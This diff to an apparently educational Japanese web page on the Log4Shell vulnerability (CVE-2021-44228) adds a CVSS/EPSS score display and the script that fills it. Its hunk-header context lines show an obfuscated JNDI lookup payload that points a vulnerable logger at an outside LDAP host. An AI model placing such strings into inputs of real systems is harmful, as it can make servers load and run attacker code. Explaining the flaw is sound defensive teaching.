@@ -38,6 +38,9 @@
                             <h3 class="pt-4 mt-4 border-bottom fw-bold" id="log4shell">
                                 Log4Shell (CVE-2021-44228)
                             </h3>
+                            <h4 class="py-3 fw-bold">
+                                &emsp;&emsp;CVSS : <span id="cvss-value"></span>&emsp;EPSS : <span id="epss-value"></span>
+                            </h4>
                             <ul>
                                 <li> Apache Log4j 2 に存在した脆弱性</li>
                                 <li> ログ出力対象の文字列に含まれる <code>${}</code> 形式の<b>Lookup構文</b>が、ログ出力時に評価・実行されてしまうことが原因</li>
@@ -242,6 +245,7 @@ ${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}</code></pre>
         <script src="/view/md.js"></script>
         <script src="/view/pagination.js"></script>
         <script src="/view/tex.js"></script>
+        <script src="/view/api.js"></script>
         <script>
             hljs.highlightAll();
             embedded_html("/template/styleConfig.html", "styleList");
@@ -272,6 +276,7 @@ ${${::-j}${::-n}${::-d}${::-i}:ldap://ldap.zone/[検索キー]}</code></pre>
             )
 
             new Pagination(4, securityModel.page, "pagination");
+            new GetCveScore("CVE-2021-44228", "cvss-value", "epss-value");
         </script>
     </footer>
     
